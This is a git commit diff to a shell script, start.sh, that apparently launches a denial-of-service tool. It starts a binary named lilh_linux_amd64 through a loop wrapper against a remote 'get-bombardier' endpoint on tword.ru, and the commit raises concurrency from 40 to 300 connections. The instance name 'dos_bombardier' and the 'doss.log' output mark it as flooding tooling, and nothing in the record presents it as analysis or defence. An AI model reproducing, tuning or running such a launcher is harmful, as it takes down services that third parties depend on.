c76a3a43dcb1a63ef9b9b01dd7e2e264906748d0
mberc <mishaberces@gmail.com>
2022-03-12 15:24:21 +0200

    correct params parse

--- start.sh
+++ start.sh
@@ -8,9 +8,9 @@ ulimit -n 5000
 instance_id=dos_bombardier
 
 filter="instance.id=$instance_id"
-nohup ./loop.sh ./lilh_linux_amd64 -c=40 "https://tword.ru//site/get-bombardier" instance.id=$instance_id >> doss.log 2>&1 & echo ok
+nohup ./loop.sh ./lilh_linux_amd64 -c=300 "https://tword.ru//site/get-bombardier?count=2&addKey=1" instance.id=$instance_id >> doss.log 2>&1 & echo ok
 sleep 2m 30s
-nohup ./loop.sh ./lilh_linux_amd64 -c=40 "https://tword.ru//site/get-bombardier" instance.id=$instance_id >> doss2.log1 2>&1 & echo ok
+nohup ./loop.sh ./lilh_linux_amd64 -c=300 "https://tword.ru//site/get-bombardier?count=2&addKey=1" instance.id=$instance_id >> doss2.log1 2>&1 & echo ok
 printf "\n"
 ps -v | grep $filter
 printf "\n"  
